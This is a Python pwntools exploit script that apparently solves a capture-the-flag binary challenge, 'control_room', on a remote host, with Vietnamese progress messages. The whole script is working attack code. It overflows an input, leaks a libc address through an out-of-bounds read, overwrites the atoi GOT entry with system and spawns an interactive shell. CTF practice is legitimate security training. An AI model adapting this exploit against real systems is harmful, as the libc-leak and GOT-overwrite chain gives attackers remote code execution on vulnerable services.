#!/usr/bin/env python3

from pwn import *

exe = ELF("./control_room_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

#p = process()
p = remote('94.237.58.94',49443)

p.sendlineafter(b'username: ',b'a'*256)
#p.sendlineafter(b'> ',b'n')

p.sendlineafter(b'size: ',b'256')
p.sendlineafter(b'username: ',b'abcdef')



log.success("buoc 1 thanh cong")

log.info("buoc 2 : leak libc")
p.sendlineafter(b':',b'3')
for i in range(8):
    p.sendlineafter(b':',b'-')

p.sendlineafter(b'> ',b'y')
p.sendlineafter(b':',b'4')
p.recvuntil(b'[1]')
p.recvlines(2)
p.recvuntil(b'Longitude : ')
leak = int(p.recvline()[:-1])
libc.address = leak -0x43654
print(hex(libc.address))
log.success("leak libc thanh cong")

offset = (exe.got.atoi-exe.sym.engines) // 16

print(type(libc.sym.system))
print(libc.sym.system)
p.sendlineafter(b'-5]: ',b'5')
p.sendlineafter(b'role: ',b'1')

p.sendlineafter(b']: ',b'1')
p.sendlineafter(b']: ',str(offset))
p.sendlineafter(b'Thrust: ',str(libc.sym.system))
p.sendlineafter(b'ratio: ',b'-')
p.sendlineafter(b'> ',b'y')
log.success("over got thanh cong")
p.sendlineafter(b']: ',b'sh')

p.interactive()
